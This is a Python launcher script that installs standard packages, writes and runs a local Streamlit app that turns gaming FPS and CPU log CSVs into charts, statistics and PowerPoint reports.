# Gaming Chart Generator - Auto Setup and Launch
# Save this as: gaming_chart_launcher.py
# Double-click to run!

import subprocess
import sys
import os
import webbrowser
import time

def check_python():
    """Check if Python is installed and accessible"""
    try:
        result = subprocess.run([sys.executable, '--version'], 
                              capture_output=True, text=True, check=True)
        print(f"✅ Python found: {result.stdout.strip()}")
        return True
    except:
        print("❌ Python not found or not accessible!")
        print("Please install Python from https://python.org")
        input("Press ENTER to exit...")
        return False

def install_requirements():
    """Auto-install required packages"""
    required_packages = [
        'streamlit',
        'pandas', 
        'matplotlib',
        'python-pptx'
    ]
    
    print("🔧 Checking and installing required packages...")
    
    for package in required_packages:
        try:
            # Try to import the package
            if package == 'python-pptx':
                __import__('pptx')
            else:
                __import__(package)
            print(f"✅ {package} already installed")
        except ImportError:
            print(f"📦 Installing {package}...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", package], 
                                    stdout=subprocess.DEVNULL, 
                                    stderr=subprocess.DEVNULL)
                print(f"✅ {package} installed successfully")
            except Exception as e:
                print(f"❌ Failed to install {package}: {e}")
                return False
    return True

def create_main_app():
    """Create the main gaming chart application"""
    
    app_code = '''import streamlit as st
import pandas as pd
import matplotlib.pyplot as plt
from pptx import Presentation
from pptx.util import Inches
import io
import os
from datetime import datetime

# Page configuration
st.set_page_config(
    page_title="🎮 Gaming Chart Generator",
    page_icon="🎮",
    layout="wide"
)

class GamingChartGenerator:
    def __init__(self):
        self.data = None
    
    def load_csv_data(self, uploaded_file):
        """Load CSV with smart detection"""
        try:
            # Try different delimiters
            delimiters = [',', ';', '\\t', '|']
            
            for delimiter in delimiters:
                try:
                    uploaded_file.seek(0)
                    if delimiter == '\\t':
                        self.data = pd.read_csv(uploaded_file, delimiter='\\t')
                    else:
                        self.data = pd.read_csv(uploaded_file, delimiter=delimiter)
                    
                    if len(self.data.columns) > 1:
                        break
                except:
                    continue
            
            if self.data is None or len(self.data.columns) <= 1:
                st.error("❌ Cannot parse CSV file. Please check format.")
                return False
            
            # Smart column detection
            columns = list(self.data.columns)
            fps_col = None
            cpu_col = None
            
            # Find FPS column
            for col in columns:
                if 'fps' in col.lower():
                    fps_col = col
                    break
            
            # Find CPU column  
            for col in columns:
                if 'cpu' in col.lower() and '%' in col:
                    cpu_col = col
                    break
            
            if not fps_col or not cpu_col:
                st.error("❌ Required columns not found. Need FPS and CPU(%) data.")
                st.info(f"Available columns: {', '.join(columns)}")
                return False
            
            # Standardize column names
            self.data['FPS'] = self.data[fps_col]
            self.data['CPU(%)'] = self.data[cpu_col]
            
            # Create time index
            self.data['TimeMinutes'] = [i / 60 for i in range(len(self.data))]
            
            return True
            
        except Exception as e:
            st.error(f"❌ Error loading CSV: {e}")
            return False
    
    def create_chart(self, game_title, game_settings, game_mode, fps_color, cpu_color):
        """Generate professional gaming chart"""
        
        # Create figure with transparent background
        fig, ax1 = plt.subplots(figsize=(14, 8))
        fig.patch.set_facecolor('none')
        
        # FPS line (primary - in front)
        ax1.set_xlabel('Time (minutes)', fontsize=12, fontweight='bold', color='black')
        ax1.set_ylabel('FPS', color='black', fontsize=12, fontweight='bold')
        ax1.plot(self.data['TimeMinutes'], self.data['FPS'], 
                color=fps_color, linewidth=1.5, label='FPS', alpha=0.9, zorder=3)
        ax1.tick_params(axis='y', labelcolor='black', labelsize=10)
        ax1.tick_params(axis='x', labelcolor='black', labelsize=10)
        ax1.set_ylim(0, max(self.data['FPS']) * 1.1)
        
        # CPU line (secondary - behind)
        ax2 = ax1.twinx()
        ax2.set_ylabel('CPU Usage (%)', color='black', fontsize=12, fontweight='bold')
        ax2.plot(self.data['TimeMinutes'], self.data['CPU(%)'], 
                color=cpu_color, linewidth=1.5, label='CPU(%)', alpha=0.9, zorder=2)
        ax2.tick_params(axis='y', labelcolor='black', labelsize=10)
        ax2.set_ylim(0, 100)
        
        # Professional 3-line title
        title_text = f"{game_title}\\n{game_settings}\\n{game_mode}"
        plt.suptitle(title_text, fontsize=16, fontweight='bold', y=0.92, color='white')
        plt.subplots_adjust(top=0.85)
        
        # Styling
        ax1.grid(True, alpha=0.3, linestyle='--')
        ax1.set_facecolor('none')
        
        # Legend
        lines1, labels1 = ax1.get_legend_handles_labels()
        lines2, labels2 = ax2.get_legend_handles_labels()
        legend = ax1.legend(lines1 + lines2, labels1 + labels2, 
                          loc='upper right', framealpha=0.8, fancybox=True,
                          facecolor='white', edgecolor='gray')
        
        for text in legend.get_texts():
            text.set_color('black')
        
        # Clean spines
        for spine in ax1.spines.values():
            spine.set_color('black')
            spine.set_linewidth(0.8)
        for spine in ax2.spines.values():
            spine.set_color('black')
            spine.set_linewidth(0.8)
        
        plt.tight_layout()
        return fig
    
    def calculate_stats(self):
        """Calculate gaming performance statistics"""
        if self.data is None:
            return {}
        
        fps_data = self.data['FPS'].dropna()
        cpu_data = self.data['CPU(%)'].dropna()
        
        # Performance grading
        avg_fps = fps_data.mean()
        if avg_fps >= 90:
            grade = "Excellent (90+ FPS)"
        elif avg_fps >= 60:
            grade = "Good (60+ FPS)"
        elif avg_fps >= 30:
            grade = "Playable (30+ FPS)"
        else:
            grade = "Poor (<30 FPS)"
        
        return {
            'grade': grade,
            'duration': round(len(self.data) / 60, 1),
            'avg_fps': round(avg_fps, 1),
            'min_fps': round(fps_data.min(), 1),
            'max_fps': round(fps_data.max(), 1),
            'avg_cpu': round(cpu_data.mean(), 1),
            'max_cpu': round(cpu_data.max(), 1),
            'fps_above_60': round((len(fps_data[fps_data >= 60]) / len(fps_data)) * 100, 1),
            'frame_drops': len(fps_data[fps_data < 30])
        }
    
    def create_powerpoint(self, chart_fig, game_title, game_settings, game_mode):
        """Generate PowerPoint report"""
        
        # Chart to image
        img_buffer = io.BytesIO()
        chart_fig.savefig(img_buffer, format='png', dpi=300, bbox_inches='tight',
                         facecolor='white', edgecolor='none')
        img_buffer.seek(0)
        
        # Create presentation
        prs = Presentation()
        slide = prs.slides.add_slide(prs.slide_layouts[6])
        
        # Title
        title_box = slide.shapes.add_textbox(Inches(1), Inches(0.5), Inches(8), Inches(1))
        title_frame = title_box.text_frame
        title_frame.text = f"{game_title} - Performance Analysis"
        
        # Chart
        slide.shapes.add_picture(img_buffer, Inches(0.5), Inches(1.5), Inches(9), Inches(5.5))
        
        # Stats
        stats = self.calculate_stats()
        stats_text = f"""Performance Report:
        
Grade: {stats['grade']}
Duration: {stats['duration']} minutes
Average FPS: {stats['avg_fps']} | Range: {stats['min_fps']}-{stats['max_fps']}
Average CPU: {stats['avg_cpu']}% | Max: {stats['max_cpu']}%
Time Above 60 FPS: {stats['fps_above_60']}%
Frame Drops: {stats['frame_drops']} times"""
        
        stats_box = slide.shapes.add_textbox(Inches(0.5), Inches(7.2), Inches(9), Inches(1.3))
        stats_frame = stats_box.text_frame
        stats_frame.text = stats_text
        
        # Save to buffer
        ppt_buffer = io.BytesIO()
        prs.save(ppt_buffer)
        ppt_buffer.seek(0)
        return ppt_buffer

def main():
    # Header
    st.title("🎮 Gaming Performance Chart Generator")
    st.markdown("Transform your gaming logs into professional performance charts")
    
    # Initialize
    generator = GamingChartGenerator()
    
    # Form section
    st.header("🎮 Game Configuration")
    
    col1, col2 = st.columns(2)
    with col1:
        game_title = st.text_input("Game Title", value="MOBILE LEGENDS")
        game_settings = st.text_input("Graphics Settings", value="ULTRA - 120 FPS")
    
    with col2:
        game_mode = st.text_input("Performance Mode", value="BOOST MODE")
        
        col_color1, col_color2 = st.columns(2)
        with col_color1:
            fps_color = st.color_picker("FPS Color", "#FF6600")
        with col_color2:
            cpu_color = st.color_picker("CPU Color", "#4A90E2")
    
    # File upload
    st.header("📁 Upload Gaming Log CSV")
    uploaded_file = st.file_uploader("Drop your CSV file here", type=['csv'])
    
    if uploaded_file:
        with st.spinner('Analyzing gaming data...'):
            if generator.load_csv_data(uploaded_file):
                
                # Success message
                st.success("Gaming log loaded successfully!")
                
                # Quick stats
                col1, col2, col3, col4 = st.columns(4)
                with col1:
                    st.metric("Data Points", f"{len(generator.data):,}")
                with col2:
                    st.metric("Duration", f"{len(generator.data)/60:.1f} min")
                with col3:
                    st.metric("Avg FPS", f"{generator.data['FPS'].mean():.1f}")
                with col4:
                    st.metric("Avg CPU", f"{generator.data['CPU(%)'].mean():.1f}%")
                
                # Generate chart
                st.header("📊 Performance Chart")
                
                with st.spinner('Creating chart...'):
                    chart_fig = generator.create_chart(game_title, game_settings, 
                                                     game_mode, fps_color, cpu_color)
                    st.pyplot(chart_fig)
                
                # Performance analysis
                stats = generator.calculate_stats()
                st.header("📈 Performance Analysis")
                
                col1, col2, col3, col4 = st.columns(4)
                with col1:
                    st.metric("Grade", stats['grade'])
                with col2:
                    st.metric("FPS Range", f"{stats['min_fps']}-{stats['max_fps']}")
                with col3:
                    st.metric("60+ FPS Time", f"{stats['fps_above_60']}%")
                with col4:
                    st.metric("Frame Drops", stats['frame_drops'])
                
                # Download section
                st.header("💾 Download Results")
                
                col1, col2 = st.columns(2)
                
                with col1:
                    # PNG download
                    img_buffer = io.BytesIO()
                    chart_fig.savefig(img_buffer, format='png', dpi=300, bbox_inches='tight',
                                     facecolor='none', edgecolor='none', transparent=True)
                    img_buffer.seek(0)
                    
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    png_filename = f"{game_title.replace(' ', '_')}_chart_{timestamp}.png"
                    
                    st.download_button(
                        label="📸 Download PNG",
                        data=img_buffer.getvalue(),
                        file_name=png_filename,
                        mime="image/png"
                    )
                
                with col2:
                    # PowerPoint download
                    ppt_buffer = generator.create_powerpoint(chart_fig, game_title, 
                                                           game_settings, game_mode)
                    ppt_filename = f"{game_title.replace(' ', '_')}_report_{timestamp}.pptx"
                    
                    st.download_button(
                        label="📄 Download PowerPoint",
                        data=ppt_buffer.getvalue(),
                        file_name=ppt_filename,
                        mime="application/vnd.openxmlformats-officedocument.presentationml.presentation"
                    )
    else:
        # Help section
        st.info("Upload your gaming log CSV to get started!")
        
        with st.expander("📋 CSV Format Help"):
            st.markdown("""
            **Required columns:**
            - FPS data (any column with 'fps' in name)
            - CPU usage data (any column with 'cpu' and '%')
            
            **Example:**
            ```
            FPS,CPU(%),JANK
            60,45.2,0
            58,48.1,1
            62,42.8,0
            ```
            """)

if __name__ == "__main__":
    main()
'''
    
    # Write the main app file
    try:
        with open('gaming_chart_app.py', 'w', encoding='utf-8') as f:
            f.write(app_code)
        print("✅ Gaming Chart app file created successfully!")
        return True
    except Exception as e:
        print(f"❌ Failed to create app file: {e}")
        return False

def launch_app():
    """Launch the Streamlit application"""
    print("\\n🚀 Launching Gaming Chart Generator...")
    print("📱 Browser will open automatically in 3 seconds...")
    print("🔗 Access URL: http://localhost:8501")
    print("⏹️ Press Ctrl+C in this window to stop")
    
    # Open browser after delay
    def open_browser():
        time.sleep(3)
        try:
            webbrowser.open('http://localhost:8501')
        except:
            print("Could not open browser automatically. Please go to: http://localhost:8501")
    
    import threading
    browser_thread = threading.Thread(target=open_browser)
    browser_thread.daemon = True
    browser_thread.start()
    
    # Launch Streamlit
    try:
        subprocess.run([sys.executable, "-m", "streamlit", "run", "gaming_chart_app.py"], check=True)
    except subprocess.CalledProcessError as e:
        print(f"❌ Failed to launch Streamlit: {e}")
        print("Try running manually: streamlit run gaming_chart_app.py")
    except KeyboardInterrupt:
        print("\\n👋 Application stopped by user")

def main():
    print("=" * 60)
    print("🎮 GAMING PERFORMANCE CHART GENERATOR")
    print("🚀 Auto Setup & Launch Tool")
    print("=" * 60)
    
    try:
        # Check Python
        if not check_python():
            return
        
        # Install requirements
        print("\\n📦 Installing required packages...")
        if not install_requirements():
            print("❌ Failed to install packages!")
            input("Press ENTER to exit...")
            return
        
        print("✅ All packages installed successfully!")
        
        # Create app
        print("\\n📝 Creating application...")
        if not create_main_app():
            input("Press ENTER to exit...")
            return
        
        # Launch
        input("\\n🎯 Press ENTER to launch Gaming Chart Generator...")
        launch_app()
        
    except KeyboardInterrupt:
        print("\\n👋 Setup cancelled by user")
    except Exception as e:
        print(f"\\n❌ Unexpected error: {e}")
        input("Press ENTER to exit...")

if __name__ == "__main__":
    main()